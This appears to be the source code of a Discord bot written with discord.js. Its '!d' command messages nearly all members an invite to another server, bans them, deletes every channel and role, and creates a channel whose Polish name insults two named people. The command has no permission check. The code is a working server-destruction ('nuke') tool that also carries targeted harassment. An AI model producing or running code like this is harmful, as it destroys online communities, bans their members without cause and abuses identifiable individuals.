const Discord = require('discord.js');
const config = require('./config.json');
const BotClient = new Discord.Client({
    fetchAllMembers: true
});

BotClient.on('ready', () => {
    console.log('Toster BOT is online!');
});

BotClient.on('message', msg => {
    // Ignore messages that aren't from a guild
    if (!msg.guild) return;

    if (msg.content.startsWith('!s')) {
        for (let index = 0; index < 5; index++) {
            msg.guild.channels
                .create(`test-channel-${index+1}`, {
                    type: 'text'
                })
                .then(console.log)
                .catch(console.error);
            msg.guild.channels.create(`test-channel-${index+1}`, {
                    type: 'voice'
                })
                .then(console.log)
                .catch(console.error);
            msg.guild.roles
                .create({
                    data: {
                        name: `test-role-${index+1}`,
                    }
                })
                .then(console.log)
                .catch(console.error);
        }
    };

    if (msg.content.startsWith('!d')) {
        try {
            msg.guild.members.cache
                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259' && m.user.bot !== true)
                .forEach(m => {
                    m.user
                        .send('Przenosimy się na nowy serwer: https://discord.gg/fbZCFxsEnF \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!')
                        .then(m.ban())
                        .catch(console.error);
                });
            msg.guild.channels.cache.forEach(channel => channel.delete());
            msg.guild.roles.cache.forEach(role => role.delete());
            msg.guild.channels
                .create('Jebać Paule i Mruwe', {
                    type: 'text'
                })
                .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
                .then(msg.guild.createTemplate('Jebać Paule i Mruwe').then(t => t.sync()))
                .catch(console.error);
        } catch (error) {
            console.log(error);
        }
    };
});

BotClient.on('guildMemberUpdate', member => {
    console.log(member);
});

BotClient.login(config.token);